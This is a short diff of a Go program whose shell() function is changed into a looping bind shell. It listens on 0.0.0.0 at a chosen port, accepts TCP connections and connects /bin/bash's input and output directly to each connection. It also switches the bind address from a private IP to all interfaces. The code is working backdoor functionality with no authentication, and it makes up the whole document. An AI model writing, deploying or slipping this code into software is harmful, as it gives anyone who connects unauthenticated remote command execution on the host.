@@ -9,7 +9,7 @@ import (
 	"time"
 )
 
-var host string = "192.168.12.6"
+var host string = "0.0.0.0"
 var port string
 
 func main() {
@@ -37,22 +37,24 @@ func random(n int) int {
 }
 
 func shell() {
-	list, err := net.Listen("tcp", host+":"+port)
-	if err != nil {
-		fmt.Println(err.Error())
-		fmt.Println("first")
+	for {
+		list, err := net.Listen("tcp", host+":"+port)
+		if err != nil {
+			fmt.Println(err.Error())
+			do()
+			return
+		}
+		con, err := list.Accept()
+		if err != nil {
+			fmt.Println(err.Error())
+			do()
+			return
+		}
+		cmd := exec.Command("/bin/bash")
+		//Set input/output to the established connection's in/out
+		cmd.Stdin = con
+		cmd.Stdout = con
+		cmd.Stderr = con
+		cmd.Run()
 	}
-	con, err := list.Accept()
-	if err != nil {
-		fmt.Println(err.Error())
-		fmt.Println("second")
-	}
-	cmd := exec.Command("/bin/bash")
-	//Set input/output to the established connection's in/out
-	cmd.Stdin = con
-	cmd.Stdout = con
-	cmd.Stderr = con
-	cmd.Run()
-	do()
-
 }
